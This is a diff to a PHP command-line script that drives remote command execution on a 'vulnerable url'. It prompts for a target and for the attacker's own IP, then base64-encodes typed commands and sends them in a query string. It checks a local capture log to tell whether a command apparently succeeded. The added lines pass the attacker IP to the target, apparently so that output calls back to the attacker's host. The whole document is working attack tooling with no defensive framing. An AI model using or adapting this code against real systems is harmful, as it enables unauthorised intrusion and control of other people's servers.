@@ -5,9 +5,15 @@ error_reporting(E_PARSE | E_ERROR);
 if (!defined('t_ip')){
     define('t_ip', trim(readline('vulnerable url? -> ')));
 }
+
+if (!defined('us')){
+    define('us', trim(readline('whats our ip: ')));
+}
+
 while (true){
     $command = trim(readline("command: -> "));
-    $f = explode('\n', file_get_contents(t_ip.'&qq='. base64_encode($command)));
+    echo "Attempting: " . t_ip.'&qq='. base64_encode($command).'&p='. us . PHP_EOL;
+    $f = explode('\n', file_get_contents(t_ip.'?p='. us . '&qq='. base64_encode($command)));
     if (!is_null(file(getenv('HOME').'/capture_log.log')[0])){
         system('clear');
         echo "\033[0;36m$command appears to have been successful!\033[0m".PHP_EOL;
